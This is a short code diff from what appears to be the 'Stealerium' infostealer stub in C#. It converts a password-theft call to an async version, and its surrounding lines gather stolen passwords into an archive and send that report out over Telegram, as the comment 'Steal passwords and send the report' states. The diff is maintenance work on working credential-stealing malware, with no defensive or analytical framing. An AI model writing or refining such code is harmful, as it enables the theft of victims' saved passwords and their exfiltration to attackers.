@@ -64,7 +64,7 @@ namespace Stealerium.Stub
             }
 
             // Steal passwords and send the report
-            var passwords = Passwords.Save();
+            var passwords = await Passwords.SaveAsync();
             var archive = Filemanager.CreateArchive(passwords);
             await Telegram.SendReportAsync(archive).ConfigureAwait(false);
 
